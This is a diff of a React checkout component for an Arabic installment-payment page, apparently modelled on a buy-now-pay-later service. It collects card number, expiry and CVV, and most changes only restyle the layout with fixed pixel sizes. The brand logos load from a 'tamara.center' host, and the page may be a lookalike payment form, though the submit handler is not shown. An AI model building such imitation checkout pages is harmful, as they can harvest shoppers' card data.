@@ -60,16 +60,6 @@ const isValidExpiry = (value: string): boolean => {
   return expiry >= new Date(now.getFullYear(), now.getMonth());
 };
 
-// Card brand icons for inside input field
-const CardBrandIcons = () => (
-  <span className="brand-logos-inside" aria-hidden="true">
-    <img src="https://checkout.tamara.center/v.jpg" alt="American Express" />
-    <img src="https://checkout.tamara.center/vv.jpg" alt="Visa" />
-    <img src="https://checkout.tamara.center/vvv.jpg" alt="Mastercard" />
-    <img src="https://checkout.tamara.center/vvvv.jpg" alt="Mada" />
-  </span>
-);
-
 const CardInfo = ({
   cardName,
   cardNumber,
@@ -176,47 +166,53 @@ const CardInfo = ({
           <h1 className="page-title">التأكيد والدفع</h1>
 
           {/* Card Form Section */}
-          <div className="card-form-section">
+          <div className="card-form-section" style={{ width: '364px', height: '149px' }}>
             {/* Card Header */}
             <div className="card-header">
-              <span className="add-card-text">أضف بطاقة جديدة</span>
+              <div className="add-card-text" style={{ color: '#000' }}>أضف بطاقة جديدة</div>
               <span className="radio-circle"></span>
             </div>
 
             {/* Card Number Input with Brand Icons Inside */}
-            <div className="card-number-input-container" style={{ padding: '0 20px' }}>
-              <div className="relative">
-                <input
-                  id="card_number"
-                  value={cardNumber}
-                  onChange={handleCardNumberChange}
-                  placeholder="0000 0000 0000 0000"
-                  className="card-input-field"
-                  style={{ 
-                    color: '#1F2937',
-                    letterSpacing: '0.15em',
-                    direction: 'ltr'
-                  }}
-                  maxLength={19}
-                />
-                <CardBrandIcons />
-              </div>
+            <div className="card-number-input-container" style={{ width: '362px', height: '43px' }}>
+              <input
+                id="card_number"
+                value={cardNumber}
+                onChange={handleCardNumberChange}
+                placeholder="0000 0000 0000 0000"
+                className="card-input-field"
+                style={{
+                  height: '43px',
+                  paddingLeft: '145px',
+                  color: '#1F2937',
+                  letterSpacing: '0.15em',
+                  direction: 'ltr'
+                }}
+                maxLength={19}
+              />
+              <span className="brand-logos-inside" style={{ width: '110.89px', height: '18px' }} aria-hidden="true">
+                <img src="https://checkout.tamara.center/v.jpg" alt="American Express" />
+                <img src="https://checkout.tamara.center/vv.jpg" alt="Visa" />
+                <img src="https://checkout.tamara.center/vvv.jpg" alt="Mastercard" />
+                <img src="https://checkout.tamara.center/vvvv.jpg" alt="Mada" />
+              </span>
             </div>
 
-            {/* CVV and Expiry Row - No Gap */}
-            <div className="cvv-expiry-row" style={{ padding: '0 20px 20px' }}>
-              <div className="card-number-input-container">
+            {/* CVV and Expiry Row */}
+            <div className="cvv-expiry-row" style={{ width: '362px', height: '42px' }}>
+              <div className="card-number-input-container" style={{ width: '181px', height: '42px' }}>
                 <input
                   value={cardExpiry}
                   onChange={handleExpiryChange}
                   placeholder="MM/YY"
                   className="card-input-field"
-                  style={{ 
-                    border: expiryInvalid 
-                      ? '1px solid #EF4444' 
+                  style={{
+                    height: '42px',
+                    border: expiryInvalid
+                      ? '1px solid #EF4444'
                       : 'none',
-                    borderBottom: expiryInvalid 
-                      ? 'none' 
+                    borderBottom: expiryInvalid
+                      ? 'none'
                       : '1px solid var(--purple-line)',
                     color: '#1F2937',
                     direction: 'ltr'
@@ -227,14 +223,15 @@ const CardInfo = ({
                   <p className="text-xs mt-1 text-right" style={{ color: '#EF4444' }}>تاريخ انتهاء غير صالح</p>
                 )}
               </div>
-              <div className="card-number-input-container">
+              <div className="card-number-input-container" style={{ width: '181px', height: '42px' }}>
                 <input
                   value={cardCvv}
                   onChange={e => setCardCvv(toEnglishNumbers(e.target.value))}
                   placeholder="CVV"
                   type="password"
                   className="card-input-field"
-                  style={{ 
+                  style={{
+                    height: '42px',
                     border: 'none',
                     borderBottom: '1px solid var(--purple-line)',
                     color: '#1F2937',
@@ -249,32 +246,29 @@ const CardInfo = ({
           {/* Plan Section */}
           {selectedPlan && (
             <>
-              <div className="plan-title">اختار الخطة</div>
-              
-              <div 
+              <div className="plan-title" style={{ width: '376px', height: '22px' }}>اختار الخطة</div>
+
+              <div
                 className="plan-box"
+                style={{ width: '370px', height: '87px' }}
                 onClick={() => setShowPlanDetails(!showPlanDetails)}
               >
-                <div className="plan-header">
-                  <div className="plan-details">
+                <div className="plan-header" style={{ width: '332px', height: '57px' }}>
+                  <div className="plan-details" style={{ width: '245.17px', height: '57px' }}>
                     <div className="monthly-amount">
                       {formatPrice(selectedPlan.perInstallment)} ريال
-                      <span className="usd-badge">
-                        <small>$</small>{monthlyAmountUSD}
-                      </span>
+                      <span className="usd-badge"><small>$</small>{monthlyAmountUSD}</span>
                       <span>/شهرياً</span>
                     </div>
                     <div className="total-amount-details">
                       {selectedPlan.installmentsCount} دفعات · الإجمالي
                       <span>
                         {formatPrice(selectedPlan.totalAmount)} ريال
-                        <span className="usd-badge" style={{ marginRight: '4px' }}>
-                          <small>$</small>{totalAmountUSD}
-                        </span>
+                        <span className="usd-badge"><small>$</small>{totalAmountUSD}</span>
                       </span>
                     </div>
                   </div>
-                  <span className={`arrow-icon ${showPlanDetails ? 'rotated' : ''}`}>›</span>
+                  <div className="arrow-icon" style={{ width: '15.65px', height: '30px' }}>&gt;</div>
                 </div>
               </div>
 
@@ -353,11 +347,14 @@ const CardInfo = ({
           onClick={onSubmit}
           disabled={!isFormValid}
           className={`payment-btn ${isFormValid ? 'active' : ''}`}
+          style={{ width: '370px', height: '54px' }}
         >
-          {selectedPlan 
-            ? `ادفع ${formatPrice(selectedPlan.perInstallment)} ريال / شهر`
-            : 'ادفع الآن'
-          }
+          {selectedPlan ? (
+            <>
+              ادفع {formatPrice(selectedPlan.perInstallment)} ريال
+              <span className="usd-badge"><small>$</small>{monthlyAmountUSD}</span>
+            </>
+          ) : 'ادفع الآن'}
         </button>
       </div>
     </div>
